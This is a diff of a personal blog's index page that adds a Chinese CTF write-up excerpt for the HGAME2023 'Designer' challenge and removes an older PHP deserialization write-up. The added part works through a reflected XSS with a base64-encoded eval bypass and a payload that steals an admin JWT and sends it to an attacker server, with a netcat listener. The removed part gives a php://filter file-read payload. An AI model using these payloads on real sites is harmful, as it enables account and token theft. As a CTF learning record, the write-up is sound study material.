@@ -131,6 +131,62 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/12/20/HGAME2023-Designer-wp/" >HGAME2023-Designer-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-12-20
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3780">题目链接</a>  </p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>register 会用post过去的username，flag和secret生成token  并直接回显</p>
+<p>如果发起请求的ip是本地的话  flag为真  否则是假的</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/user/register&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">  <span class="keyword">let</span> flag = <span class="string">&quot;hgame&#123;fake_flag_here&#125;&quot;</span></span><br><span class="line">  <span class="keyword">if</span> (username == <span class="string">&quot;admin&quot;</span> &amp;&amp; req.<span class="property">ip</span> == <span class="string">&quot;127.0.0.1&quot;</span> || req.<span class="property">ip</span> == <span class="string">&quot;::ffff:127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    flag = <span class="string">&quot;hgame&#123;true_flag_here&#125;&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123; username, flag &#125;, secret)</span><br><span class="line">  res.<span class="title function_">json</span>(&#123; token &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>其他路由都要求经过auth函数，明显需要在包头中添加<code>authorization: token </code> 否则跳转至根目录</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">auth</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> token = req.<span class="property">headers</span>[<span class="string">&quot;authorization&quot;</span>]</span><br><span class="line">  <span class="keyword">if</span> (!token) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> decoded = jwt.<span class="title function_">verify</span>(token, secret) || &#123;&#125;</span><br><span class="line">    req.<span class="property">user</span> = decoded</span><br><span class="line">  &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&quot;jwt decode error&quot;</span> &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">next</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;user&#x2F;info 可以直接查看flag   </p>
+<p>两步：1. 获取token 2.传token看flag</p>
+<p>尝试了<code>x-forwarded-for</code>等很多伪造ip方式，都不行  这里的req.ip应该是不可伪造的</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/user/info&quot;</span>, auth, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">username</span>: req.<span class="property">user</span>.<span class="property">username</span>, <span class="attr">flag</span>: req.<span class="property">user</span>.<span class="property">flag</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;button&#x2F;share 中为关键逻辑</p>
+<p>它会访问&#x2F;button&#x2F;preview  并且参数可控  那么也就相当于本地访问 正好满足我们的要求 <code>localStorage</code>中的<code>token</code>存放生成后的token</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/button/share&quot;</span>, auth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">    <span class="attr">headless</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">executablePath</span>: <span class="string">&quot;/usr/bin/chromium&quot;</span>,</span><br><span class="line">    <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>]</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>()</span><br><span class="line">  <span class="keyword">const</span> query = querystring.<span class="title function_">encode</span>(req.<span class="property">body</span>)</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;http://127.0.0.1:9090/button/preview?&#x27;</span> + query)</span><br><span class="line">  <span class="keyword">await</span> page.evaluate(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;token&quot;</span>, <span class="string">&quot;jwt_token_here&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&quot;#button&quot;</span>)</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&quot;admin will see it later&quot;</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>访问preview路由  明显存在XSS漏洞  但是过滤了alert  我们可以通过base64绕过</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/button/preview&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> blacklist = [</span><br><span class="line">    <span class="regexp">/on/i</span>, <span class="regexp">/localStorage/i</span>, <span class="regexp">/alert/</span>, <span class="regexp">/fetch/</span>, <span class="regexp">/XMLHttpRequest/</span>, <span class="regexp">/window/</span>, <span class="regexp">/location/</span>, <span class="regexp">/document/</span></span><br><span class="line">  ]</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> req.<span class="property">query</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">of</span> blacklist) &#123;</span><br><span class="line">      <span class="keyword">if</span> (item.<span class="title function_">test</span>(key.<span class="title function_">trim</span>()) || item.<span class="title function_">test</span>(req.<span class="property">query</span>[key].<span class="title function_">trim</span>())) &#123;</span><br><span class="line">        req.<span class="property">query</span>[key] = <span class="string">&quot;&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&quot;preview&quot;</span>, &#123; <span class="attr">data</span>: req.<span class="property">query</span> &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/button/preview?<span class="number">123</span><span class="string">&quot;&gt;&lt;script&gt;eval(atob(&#x27;YWxlcnQoMik%3D&#x27;))&lt;/script&gt;</span></span><br><span class="line"><span class="string">// alert(2)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><ol>
+<li>通过share路由  构造好payload  服务器则会跳转至preview利用XSS执行我们的代码   </li>
+<li>代码中先跳转至register获得服务器本地token然后外带至我们的vps</li>
+<li>得到token后对应访问&#x2F;usr&#x2F;info即可获取flag</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">POST /button/share</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Authorization: [some_token_here]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&quot;border-radius&quot;:&quot;0px\&quot;&gt;&lt;script&gt;eval(atob(&#x27;JC5wb3N0KCIvdXNlci9yZWdpc3RlciIseyJ1c2VybmFtZSI6ImFkbWluIn0sZnVuY3Rpb24ocmVzdWx0KXtkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovLzQ3Lnh4Lnh4Lnh4Ojk5OTk/Yz0nK0pTT04uc3RyaW5naWZ5KHJlc3VsdCl9KTs=&#x27;))&lt;/script&gt;&quot;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># $.post(&quot;/user/register&quot;,&#123;&quot;username&quot;:&quot;admin&quot;&#125;,function(result)&#123;document.location=&#x27;http://47.xx.xx.xx:9999?c=&#x27;+JSON.stringify(result)&#125;);</span></span><br><span class="line"><span class="comment"># vps上开启监听：nc -lvnp 9999; 注意收到的token要去掉双引号%22</span></span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2023/12/20/HGAME2023-Designer-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/12/13/JAVA反序列化CC3/" >JAVA反序列化CC3</a>
 								</h3>
 							</div>
@@ -704,44 +760,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/10/23/GDOUCTF2023-reverseClock-wp/" >GDOUCTF2023-反方向的钟-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-10-23
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3723">题目链接</a>   </p>
-<p>简单反序列化   关键在于怎么通过<code>echo new $_POST[&#39;a&#39;]($_POST[&#39;b&#39;]);</code> 来获取flag</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$rank</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rank = <span class="variable">$rank</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$leader</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;leader = <span class="variable">$leader</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$department</span>,<span class="variable">$ceo</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;department = <span class="variable">$department</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headmaster = <span class="variable">$ceo</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">teacher</span>(<span class="string">&#x27;ing&#x27;</span>, <span class="string">&#x27;department&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">classroom</span>(<span class="string">&#x27;one class&#x27;</span>, <span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">school</span>(<span class="variable">$b</span>, <span class="string">&#x27;ong&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>
-
-<p>这里要利用到<strong>php原生类</strong> SplFileObject，可以读取文件内容，但只能输出一行   没办法输出flag</p>
-<p>需要结合php伪协议</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="built_in">SplFileObject</span>&amp;b=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>php原生类可参考：<a target="_blank" rel="noopener" href="https://johnfrod.top/%E5%AE%89%E5%85%A8/ctf-%E4%B8%AD-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">https://johnfrod.top/%E5%AE%89%E5%85%A8/ctf-%E4%B8%AD-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/</a></p>
-</blockquote>
-
-	
-	</div>
-  <a type="button" href="/2023/10/23/GDOUCTF2023-reverseClock-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -803,7 +821,7 @@
 		
 			<li><a href="/categories/web-learning/">web-learning<span>6</span></a></li>
 		
-			<li><a href="/categories/web-wp/">web-wp<span>50</span></a></li>
+			<li><a href="/categories/web-wp/">web-wp<span>51</span></a></li>
 		
 		</ul>
 	</div>
@@ -814,48 +832,48 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
+			<li><a href="/tags/SWPUCTF2022/">SWPUCTF2022<span>3</span></a></li>
 		
-			<li><a href="/tags/5字符RCE/">5字符RCE<span>1</span></a></li>
+			<li><a href="/tags/heap-overflow/">heap_overflow<span>1</span></a></li>
 		
-			<li><a href="/tags/网鼎杯2018/">网鼎杯2018<span>1</span></a></li>
+			<li><a href="/tags/javascript/">javascript<span>1</span></a></li>
 		
-			<li><a href="/tags/fmt-str/">fmt_str<span>2</span></a></li>
+			<li><a href="/tags/SwampCTF2019/">SwampCTF2019<span>1</span></a></li>
 		
-			<li><a href="/tags/IO-FILE/">IO_FILE<span>2</span></a></li>
+			<li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>13</span></a></li>
 		
-			<li><a href="/tags/stack-pivot/">stack pivot<span>3</span></a></li>
+			<li><a href="/tags/nssctf/">nssctf<span>56</span></a></li>
 		
-			<li><a href="/tags/rce/">rce<span>17</span></a></li>
-		
-			<li><a href="/tags/php原生类/">php原生类<span>1</span></a></li>
-		
-			<li><a href="/tags/深育杯2021/">深育杯2021<span>1</span></a></li>
-		
-			<li><a href="/tags/stack-overflow/">stack_overflow<span>1</span></a></li>
+			<li><a href="/tags/HCTF2018/">HCTF2018<span>1</span></a></li>
 		
 			<li><a href="/tags/php伪协议/">php伪协议<span>1</span></a></li>
 		
-			<li><a href="/tags/heap/">heap<span>4</span></a></li>
+			<li><a href="/tags/日志注入/">日志注入<span>1</span></a></li>
 		
-			<li><a href="/tags/csawquals2017/">csawquals2017<span>1</span></a></li>
+			<li><a href="/tags/HCTF2016/">HCTF2016<span>1</span></a></li>
 		
-			<li><a href="/tags/天翼杯2021/">天翼杯2021<span>1</span></a></li>
+			<li><a href="/tags/ZJCTF2019/">ZJCTF2019<span>1</span></a></li>
 		
 			<li><a href="/tags/sql/">sql<span>8</span></a></li>
 		
-			<li><a href="/tags/ret2libc/">ret2libc<span>2</span></a></li>
+			<li><a href="/tags/HNCTF2022/">HNCTF2022<span>2</span></a></li>
 		
-			<li><a href="/tags/Spring/">Spring<span>1</span></a></li>
+			<li><a href="/tags/reverse/">reverse<span>8</span></a></li>
 		
-			<li><a href="/tags/DASCTF2023/">DASCTF2023<span>1</span></a></li>
+			<li><a href="/tags/5字符RCE/">5字符RCE<span>1</span></a></li>
 		
-			<li><a href="/tags/unserialize/">unserialize<span>12</span></a></li>
+			<li><a href="/tags/CTF/">CTF<span>90</span></a></li>
 		
-			<li><a href="/tags/GDOUCTF2023/">GDOUCTF2023<span>3</span></a></li>
+			<li><a href="/tags/libc/">libc<span>1</span></a></li>
+		
+			<li><a href="/tags/鹏城杯2022/">鹏城杯2022<span>1</span></a></li>
+		
+			<li><a href="/tags/reverse-shell/">reverse shell<span>1</span></a></li>
+		
+			<li><a href="/tags/NSSCTF2022/">NSSCTF2022<span>1</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>114</span></a></li>
+		   <li><a href="/tags">...<span>118</span></a></li>
 		 
 		</ul>
 	</div>
@@ -866,6 +884,10 @@
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2023/12/20/HGAME2023-Designer-wp/" ><i class="fa fa-file-o"></i>HGAME2023-Designer-wp</a>
+      </li>
     
       <li>
         <a href="/2023/12/13/JAVA反序列化CC3/" ><i class="fa fa-file-o"></i>JAVA反序列化CC3</a>
@@ -881,10 +903,6 @@
     
       <li>
         <a href="/2023/11/24/xxe/" ><i class="fa fa-file-o"></i>xxe</a>
-      </li>
-    
-      <li>
-        <a href="/2023/11/20/CVE-2018-1259复现/" ><i class="fa fa-file-o"></i>CVE-2018-1259复现</a>
       </li>
     
   </ul>
